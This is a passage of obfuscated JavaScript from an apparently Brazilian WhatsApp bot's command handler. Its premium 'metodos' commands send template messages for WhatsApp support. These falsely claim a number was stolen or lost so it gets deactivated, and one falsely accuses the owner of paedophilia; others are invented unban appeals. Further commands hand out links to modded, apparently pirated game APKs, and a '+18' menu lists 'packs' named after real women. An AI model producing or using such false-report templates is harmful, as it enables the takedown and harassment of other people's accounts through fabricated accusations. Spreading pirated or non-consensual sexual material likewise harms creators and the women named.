                let _0xaa6cd9 = _0x1b47c4 >= 0 ? "https://telegra.ph/file/0de1379f15a0a355da4d5.jpg" : "https://telegra.ph/file/4b690e2bfe52269022a9d.jpg";
                const _0x1e69e7 = {
                  url: _0xaa6cd9
                };
                const _0x50a686 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x1e69e7,
                  'caption': "🍃 @" + _0x1911ab.split('@')[0] + " , sua sorte de agora é de " + _0x1b47c4 + "% 🍀",
                  'mentions': [_0x1911ab]
                }, _0x50a686);
              }
              break;
            case "wame":
              _0x50740b("wa.me/" + _0x246d48.split('@')[0]);
              break;
            case "wallpaperprem":
              {
                const _0x244fbc = {
                  '1': _0x141936 + "wallpp 4k",
                  '2': _0x141936 + "wallpp amarelo",
                  '3': _0x141936 + "wallpp animes",
                  '4': _0x141936 + "wallpp azul",
                  '5': _0x141936 + "wallpp branco",
                  '6': _0x141936 + "wallpp dark",
                  '7': _0x141936 + "wallpp rosa",
                  '8': _0x141936 + "wallpp roxo",
                  '9': _0x141936 + "wallpp verde",
                  '10': _0x141936 + "wallpp vermelho"
                };
                _0x56d611[_0x346d97] = {
                  'sender': _0x246d48,
                  'time': Date.now() + 30000,
                  'comandos': _0x244fbc
                };
                fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                const _0x4f78a1 = {
                  text: "ESCOLHA O WALLPAPER QUE VOCÊ QUER\n\n1. 🔳 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝟒𝐊 🔳\n2. 🟡 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐌𝐀𝐑𝐄𝐋𝐎 🟡\n3. 🎌 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐍𝐈𝐌𝐄 🎌\n4. 🔵 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐙𝐔𝐋 🔵\n5. ⚪ 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐁𝐑𝐀𝐍𝐂𝐎 ⚪\n6. ⚫ 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐃𝐀𝐑𝐊 ⚫\n7. 🟣 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐑𝐎𝐒𝐀 🟣\n8. 💜 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐑𝐎𝐗𝐎 💜\n9. 🟢 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐕𝐄𝐑𝐃𝐄 🟢\n10. 🔴 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐕𝐄𝐑𝐌𝐄𝐋𝐇𝐎 🔴"
                };
                const _0x263d77 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4f78a1, _0x263d77);
              }
              break;
            case "wallpp":
              {
                if (!_0x33286a && !_0xf59944) {
                  return _0x50740b("VOCÊ NÃO É UM USUÁRIO PREMIUM 🙂🖕");
                }
                if (!_0x11e99e) {
                  return;
                }
                _0x50740b(enviar.espere);
                _0x5aeb20 = await fetch("https://raw.githubusercontent.com/Salientekill/figurinhas/main/wallpapers/" + _0x11e99e + ".js").then(_0xf6bacc => _0xf6bacc.text());
                jsonData = JSON.parse(_0x5aeb20);
                randIndex = Math.floor(Math.random() * jsonData.length);
                foda = ["aqui está o seu " + _0x267d4b + " " + _0x671b4b, "gostou?", "eai " + _0x671b4b + " gostou?", "goxtou " + _0x671b4b, " " + _0x267d4b + " bom né?", "legal esse cmd né " + _0x671b4b + '¿', "comando foda né?", "comando foda né¿", "curtiu o cmd né?", "curtiu o comando " + _0x671b4b, "seu wallpaper já foi feito, aqui esta ele", "prontin", "terminei, aqui está", "tome seu wallpaper"];
                zaltin = foda[Math.floor(Math.random() * foda.length)];
                randKey = jsonData[randIndex];
                imagem = await getBuffer(randKey.result);
                thumbInfo = '' + zaltin;
                blabla = await getBuffer("https://telegra.ph/file/0e2989e6947b464fa66b8.jpg");
                const _0x5048d7 = {
                  image: imagem,
                  caption: '' + thumbInfo
                };
                buttonMessage = _0x5048d7;
                const _0x29f902 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, buttonMessage, _0x29f902);
              }
              break;
            case "metodos":
              {
                const _0x32255d = {
                  '1': _0x141936 + "txt-desban1",
                  '2': _0x141936 + "txt-desban2",
                  '3': _0x141936 + "txt-desban3",
                  '4': _0x141936 + "txt-desban4",
                  '5': _0x141936 + "txt-desban5",
                  '6': _0x141936 + "txt-sair-1-1",
                  '7': _0x141936 + "txt-sair-1-2",
                  '8': _0x141936 + "txt-desativar1",
                  '9': _0x141936 + "txt-desativar2",
                  '10': _0x141936 + "txt-desativar3",
                  '11': _0x141936 + "txt-desativar4",
                  '12': _0x141936 + "txt-desativar5",
                  '13': _0x141936 + "txt-desativar6",
                  '14': _0x141936 + "txt-desativar7",
                  '15': _0x141936 + "txt-desativar8",
                  '16': _0x141936 + "txt-desativar9",
                  '17': _0x141936 + "txt-desativar10"
                };
                _0x56d611[_0x346d97] = {
                  'sender': _0x246d48,
                  'time': Date.now() + 30000,
                  'comandos': _0x32255d
                };
                fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                const _0xe7a33d = {
                  text: "🧡 METODOS COMPLETOS 🧡\n\nDESBANIR NÚMEROS:\n1. 📍 TXT (1)\n2. 📍 TXT (2)\n3. 📍 TXT (3)\n4. 📍 TXT (4)\n5. 📍 TXT (5)\n\nSAIR DO -1:\n6. 📍 TXT (1)\n7. 📍 TXT (2)\n\nDESATIVAR NÚMEROS:\n8. 📍 TXT (1)\n9. 📍 TXT (2)\n10. 📍 TXT (3)\n11. 📍 TXT (4)\n12. 📍 TXT (5)\n13. 📍 TXT (6)\n14. 📍 TXT (7)\n15. 📍 TXT (8)\n16. 📍 TXT (9)\n17. 📍 TXT (10)"
                };
                const _0x124eea = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0xe7a33d, _0x124eea);
              }
              break;
            case "txt-desativar10":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nPedófila e abuso sexual , peço banimento desse número ao suporte Whatsapp , ele está envolvido com grupos de pedófilia da deep web , peço que ajudem nisso pois meu filho foi vítima.\nNúmero: +55 99 9999-9999";
              const _0x32b018 = {
                text: bymonarge
              };
              const _0x142fd1 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x32b018, _0x142fd1);
              break;
            case "txt-desativar9":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá , eu perdi todos meus documentos junto com meu celular e preciso imediatamente que desativem meu número:\n+55 99 9999-9999";
              const _0x13e0d6 = {
                text: bymonarge
              };
              const _0xd632fe = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x13e0d6, _0xd632fe);
              break;
            case "txt-desativar8":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\n偷⾛了我的⼿机和我所有的宝⻉，请⽴即禁⽌我的帐⼾\n+55 99 9999-9999";
              const _0xa50032 = {
                text: bymonarge
              };
              const _0x269dd9 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0xa50032, _0x269dd9);
              break;
            case "txt-desativar7":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá , eu gostaria de desativar meu número do WhatsApp porque eu estou migrando para o telegram , Meu número:\n+55 99 9999-9999";
              const _0x346bec = {
                text: bymonarge
              };
              const _0x234206 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x346bec, _0x234206);
              break;
            case "txt-desativar6":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá fui assaltado a uns 30 minutos e roubaram todos meus pertences , quero que desativem minha conta do whatsapp.\nNúmero: +55 99 9999-9999";
              const _0x2a226c = {
                text: bymonarge
              };
              const _0x306db7 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x2a226c, _0x306db7);
              break;
            case "txt-desativar5":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu numero do whatsapp foi roubado , desativem minha conta imensamente , desde já agradeço! meu numero :\n+55 99999-99999";
              const _0x42a261 = {
                text: bymonarge
              };
              const _0x2bcb59 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x42a261, _0x2bcb59);
              break;
            case "txt-desativar4":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nPerdido/Roubado: Por favor, desative minha conta\n+55 11 11111-11111";
              const _0x8d93cc = {
                text: bymonarge
              };
              const _0x16c07f = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x8d93cc, _0x16c07f);
              break;
            case "txt-desativar3":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nEstou solicitando a desativação temporária de minha conta no whatsapp , meu numero:\n+55 11 11111-1111";
              const _0x5ba23b = {
                text: bymonarge
              };
              const _0x22d5cb = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x5ba23b, _0x22d5cb);
              break;
            case "txt-desativar2":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nPlease Deactivate The My Account Number (número*) Immediately Because The Number Has Been Lost";
              const _0x3735b9 = {
                text: bymonarge
              };
              const _0x13441d = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x3735b9, _0x13441d);
              break;
            case "txt-desativar1":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOlá,perdi todos os meus documentos e o meu chip foi roubado. Peço que desativem\nminha conta imediatamente,no chip há dados sobre mim por isso peço que desativem,meu  número imediatamente (número)";
              const _0xa4c40b = {
                text: bymonarge
              };
              const _0xef30bb = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0xa4c40b, _0xef30bb);
              break;
            case "txt-desban1":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu número (Número) foi banido indevidamente isto foi um engano . Fui clonado e roubaram meu número preciso ativar minha conta tenho uma empresa de eletrodomésticos e tenho pedidos pendentes.";
              const _0x451c40 = {
                text: bymonarge
              };
              const _0xbcdbf5 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x451c40, _0xbcdbf5);
              break;
            case "txt-desban2":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu número (Numero) , foi banido do whatsapp injustamente e tenho provas pra mostrar que o banimento foi um erro do sistema.";
              const _0x54b468 = {
                text: bymonarge
              };
              const _0x45353d = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x54b468, _0x45353d);
              break;
            case "txt-desban4":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOla suporte do whatsapp , meu numero ,(numero) foi banido injustamente do whatsapp , estou solicitando o desbanimento imediato de meu número ";
              const _0x512597 = {
                text: bymonarge
              };
              const _0x37399d = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x512597, _0x37399d);
              break;
            case "txt-desban5":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nOla eu sou roberto silva, eu comprei um número número para meu filho fazer os trabalhos da escola em qual ele estuda , porém quando fui tentar entrar , estava dizendo que o número foi banido e eu nem sequer entrei no número, não fiz nada eu ja comprei o número e ele ja estava assim , ele precisa urgentemente desse número para fazer os trabalhos da escola.\nVerifiquem o maís rápido possível!\nNÚMERO: 55 99 9999-9999";
              const _0x12a9e9 = {
                text: bymonarge
              };
              const _0x405d70 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x12a9e9, _0x405d70);
              break;
            case "txt-desban3":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu numero foi banido, utilizo ele para falar com meus amigos e familia. Além de falar com meus clientes, e estou sendo prejudicado perdendo vendas +55 99 9999-9999";
              const _0x43317f = {
                text: bymonarge
              };
              const _0x385861 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x43317f, _0x385861);
              break;
            case "txt-sair-1-2":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nEu nao consigo entrar no whatsapp , meu número esta -1 , solicito que resetem minha verificação de número!\nNúmero: +55 99 9999-9999";
              const _0x439e6f = {
                text: bymonarge
              };
              const _0x37e90d = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x439e6f, _0x37e90d);
              break;
            case "txt-sair-1-1":
              if (!_0x33286a) {
                return _0x50740b(enviar.msg.premium);
              }
              bymonarge = "🔆 • Suporte: https://www.whatsapp.com/contact/?lang=pt_br&subject=messenger \n\n📄 • Texto: \n\nMeu número está no suporte alguém solicitou meu código por engano meu número é usado para conversas com familiares que estão com convite por favor reinicie o meu código de verificação via SMS!\nNúmero: +55 99 9999-9999";
              const _0x47a920 = {
                text: bymonarge
              };
              const _0xc7d872 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x47a920, _0xc7d872);
              break;
            case "jogos":
            case "listadejogos":
              {
                const _0x3295d9 = {
                  '1': _0x141936 + "jogo1",
                  '2': _0x141936 + "jogo2",
                  '3': _0x141936 + "jogo3",
                  '4': _0x141936 + "jogo4",
                  '5': _0x141936 + "jogo5",
                  '6': _0x141936 + "jogo6",
                  '7': _0x141936 + "jogo7",
                  '8': _0x141936 + "jogo8",
                  '9': _0x141936 + "jogo9",
                  '10': _0x141936 + "jogo10",
                  '11': _0x141936 + "jogo11",
                  '12': _0x141936 + "jogo12",
                  '13': _0x141936 + "jogo13",
                  '14': _0x141936 + "jogo14",
                  '15': _0x141936 + "jogo15",
                  '16': _0x141936 + "jogo16",
                  '17': _0x141936 + "jogo17",
                  '18': _0x141936 + "jogo18",
                  '19': _0x141936 + "jogo19",
                  '20': _0x141936 + "jogo20",
                  '21': _0x141936 + "jogo21",
                  '22': _0x141936 + "jogo22",
                  '23': _0x141936 + "jogo23",
                  '24': _0x141936 + "jogo24",
                  '25': _0x141936 + "jogo25",
                  '26': _0x141936 + "jogo26",
                  '27': _0x141936 + "jogo27"
                };
                _0x56d611[_0x346d97] = {
                  'sender': _0x246d48,
                  'time': Date.now() + 30000,
                  'comandos': _0x3295d9
                };
                fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                let _0x4e2a3e = "Lista de Jogos:\n\n" + lermais + "1. 🕹️ Minecraft 1.19.10 🕹️\n" + "2. 🕹️ Dragon Ball Z - Dokkan 🕹️\n" + "3. 🕹️ GTA San Andreas OFC 🕹️\n" + "4. 🕹️ GTA SA Legendado em Português (BR) 🕹️\n" + "5. 🕹️ GTA SA com Mod Cleo 🕹️\n" + "6. 🕹️ GTA SA Online 🕹️\n" + "7. 🕹️ GTA Super Lite + Mod Cleo 🕹️\n" + "8. 🕹️ Last Day on Earth Survival 🕹️\n" + "9. 🕹️ Bomber Friends Mod 🕹️\n" + "10. 🕹️ Arcade Hunter 🕹️\n" + "11. 🕹️ Defesa de Zombie Ocioso 🕹️\n" + "12. 🕹️ Pac-Man 🕹️\n" + "13. 🕹️ Car Driving School Simulator 🕹️\n" + "14. 🕹️ Cyber Fighters Premium 🕹️\n" + "15. 🕹️ Drag Racing 🕹️\n" + "16. 🕹️ Mr. Brow 🕹️\n" + "17. 🕹️ Airport City 🕹️\n" + "18. 🕹️ Crash Bandicoot 🕹️\n" + "19. 🕹️ Real Steel World Robot Boxing 🕹️\n" + "20. 🕹️ Anger of Sticker 🕹️\n" + "21. 🕹️ Angry Birds 2 🕹️\n" + "22. 🕹️ Especial Force Group 2 (CS) 🕹️\n" + "23. 🕹️ Roblox 🕹️\n" + "24. 🕹️ CS Striker 🕹️\n" + "25. 🕹️ Dream League Soccer 🕹️\n" + "26. 🕹️ Clash of Clans 🕹️\n" + "27. 🕹️ Criminal Case Paris 🕹️";
                const _0x57c1dd = {
                  text: _0x4e2a3e
                };
                const _0x4326a3 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x57c1dd, _0x4326a3);
              }
              break;
            case "jogo1":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* Aki está seu pedido \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ MINECRAFT 1.19.10\nhttps://www.mediafire.com/file/029rl9wpshzpet4/YX_GAMERZ.Minecraft_1.19.10_Official.apk/file\n\n© by Lotus \n");
              break;
            case "jogo2":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ DRAGON BALL Z - DOKKAN\nhttps://www.mediafire.com/file/015ibjiljfkv7uo/Dokkan_v4_12_1_MOD.apk/<file\n\n© by Akillers bot  \n");
              break;
            case "jogo3":
              await _0x50740b("\nOLÁ  AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ GTA SAN ANDREAS OFC\nhttps://www.mediafire.com/file/ln6r3kx0ie77r9t/GTA_San_Andreas_2021.zip/file\n\n©by Akillers bot  \n");
              break;
            case "jogo4":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ GTA SA LEGENDADO EM PORTUGUÊS (BR)\nhttp://www.mediafire.com/file/7op13aup1ll7m9y/GTA_SA_COM_TRADU%25C3%2587%25C3%2583O_PT-BR.zip/file\n\n©by Akillers bot  \n");
              break;
            case "jogo5":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ GTA SA COM MOD CLEO\nhttp://www.mediafire.com/file/d8cfwzctx95x0dx/GTA_SA_v2.00_Mod_Cleo.zip/file\n\n©by Akillers bot  \n");
              break;
            case "jogo6":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ GTA SA ONLINE\nhttps://www.mediafire.com/file/0xccd5m0zwqstag/GTA_SA_ONLINE_SAMP_ByHT.zip/file\n\n©by Akillers bot  \n");
              break;
            case "jogo7":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ GTA SUPER LITE + MOD CLEO\nhttp://www.mediafire.com/file/wdkg8pmndtihil3/GTA_SA_super_lite_mod_cleo_ByHT.zip/file\n\n©by Akillers bot  \n");
              break;
            case "jogo8":
              await _0x50740b("\n\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ LAST DAY ON EART SURVIVAL\nhttps://www.mediafire.com/file/k4pr6awvr5eb1ak/Last%20Day%20on%20Earth%201.17.7-mod.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo9":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ BOMBER FRIENDS MOD\nhttps://www.mediafire.com/file/dir8pwrb1mpm57w/Bomber_Friends_v4.10_MOD.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo10":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO \n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ ARCADE HUNTER\nhttps://www.mediafire.com/file/ugcdaclnpodtxxs/Arcade_Hunter-Sword%252CGun%252C_and_Magic_1.11.0-mod.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo11":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ DEFESA DE ZOMBIE OCIOSO\nhttps://www.mediafire.com/file/8422sjofw1cdnka/Zombie+Idle+Defense+1.5.79.229MOD-t.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo12":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ PAC-MAN\nhttps://www.mediafire.com/file/gxwy01ni99pcur2/PAC-MAN+9.2.7.10150MOD-t.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo13":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ CAR DRIVING SCHOOL SIMULATOR- APK:\nhttps://www.mediafire.com/file/r6aps8mn6wqoabj/Car+Driving+School+Simulator+3.1.0.283MOD-t.apk/file\n\n⚠️- OBB: obrigatório\n https://www.mediafire.com/file/hcsb5tpr7byh8fg/com.boombitgames.DrivingSchoolParking.zip/file\n\n©by Akillers bot  \n");
              break;
            case "jogo14":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ CYBER FIGHTERS PREMIUM\nhttps://www.mediafire.com/file/4tmv2cdahvqamlx/Cyber+Fighters+Premium+1.11.35.68MOD-t.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo15":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ DRAG RACING\nhttps://www.mediafire.com/file/g88v399ks1fpnfq/drag-racing-mod_2.0.37.rar/file\n\n©by Akillers bot  \n");
              break;
            case "jogo16":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ MR BROW\nhttps://www.mediafire.com/file/i0ii099sejk9fnk/Mr+Bow+4.15.75MOD-t.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo17":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ AIRPORT CITY\nhttps://www.mediafire.com/file/vuupmpp3r03lso0/Airport+City+8.7.18.101418MOD-t.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo18":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ CRASH BANDICOOT\nhttps://www.mediafire.com/file/nyx8rjqn5m51o3r/Crash+Bandicoot+Mobile+v0.7.6242+Mod.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo19":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ REAL STEEL WORLD ROBOT BOXING\n(APK+OBB) :\nhttps://www.mediafire.com/file/zcnsxb55mldn51e/Real+Steel+World+Robot+Boxing+v54.54.126+Mod.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo20":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ ANGER OF STICKER\nhttps://www.mediafire.com/file/zfmqmszkhbgoem2/anger-of-stick-5-mod_1.1.39.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo21":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ ANGRY BIRDS 2\n(APK+OBB)\nhttps://www.mediafire.com/file/uwnurszwrdbv5ge/angrybirds2-2481.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo22":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ ESPECIAL FORCE GROUP 2 (CS)\nhttps://www.mediafire.com/file/uwf5cq9u8tjg44x/specialforcesgroup2-421.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo23":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ ROBLOX\nhttps://apkadmin.com/k05ck2q6ioo1/ROBLOX_v2.459.415955_MOD_MENU.apk.html\n\n©by Akillers bot  \n");
              break;
            case "jogo24":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ CS STRIKER\nhttps://www.mediafire.com/file/7yqmk1gn4wrieri/CRITICAL_STRIKE.zip/file\n\n©by Akillers bot  \n");
              break;
            case "jogo25":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ DREAM LEAGUE SOCCER \nhttp://www.mediafire.com/file/yuw9n5d4phzz5wg/Dream_League_Soccer_2019_v6.13-mod.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo26":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ CLASH OF CLANS\nhttp://www.mediafire.com/file/aoaem76tyg0hvfv/Clash_Of_Clans_v13.675.6_MOD.apk/file\n\n©by Akillers bot  \n");
              break;
            case "jogo27":
              await _0x50740b("\nOLÁ *" + _0x671b4b + "* AKI ESTÁ SEU PEDIDO 🤙\n🪀 *Número* : @" + _0x246d48.split('@')[0] + "\n\n🕹️ CRIMINAL CASE PARIS \nhttp://www.mediafire.com/fil...e/i5pbv8d7yjbbtly/Criminal%20Case%20Paris%20v2.36.1-mod.apk/file\n\n©by Akillers bot  \n");
              break;
            case "listadepacks":
              {
                if (!_0x2f3424) {
                  return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18 1");
                }
                const _0xc9b955 = {
                  '1': _0x141936 + "packalinefaria",
                  '2': _0x141936 + "packalinefox",
                  '3': _0x141936 + "packtati",
                  '4': _0x141936 + "packalycia",
                  '5': _0x141936 + "packamiichan",
                  '6': _0x141936 + "packaninhal",
                  '7': _0x141936 + "packbabymatoso",
                  '8': _0x141936 + "packbelledel",
                  '9': _0x141936 + "packbrendat",
                  '10': _0x141936 + "packcamib",
                  '11': _0x141936 + "packcclowniac",
                  '12': _0x141936 + "packfehg",
                  '13': _0x141936 + "packgiovannac",
                  '14': _0x141936 + "packisadoram",
                  '15': _0x141936 + "packisaw",
                  '16': _0x141936 + "packlayn",
                  '17': _0x141936 + "packleticias",
                  '18': _0x141936 + "packmarinam",
